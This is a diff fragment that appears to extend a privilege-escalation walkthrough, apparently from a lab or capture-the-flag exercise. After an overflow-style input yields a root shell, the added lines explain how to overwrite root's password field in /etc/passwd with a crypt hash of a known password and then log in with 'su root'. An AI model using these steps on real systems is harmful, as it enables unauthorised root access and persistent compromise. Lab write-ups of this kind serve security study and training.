@@ -432,3 +432,14 @@
         AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`AAAAX
         # whoami
         root
+
+But we're not id 0 yet
+vim /etc/passwd
+    root:x:0:0:aaaaaa:/root:/bin/bash
+replace x with:
+    firwVQs3fu3rM
+It's the hashed version of "toto" with the C function "crypt" and the key "firefart"
+Save and quit with :wq!
+And now you can log in as root with the password toto
+    su root -
+
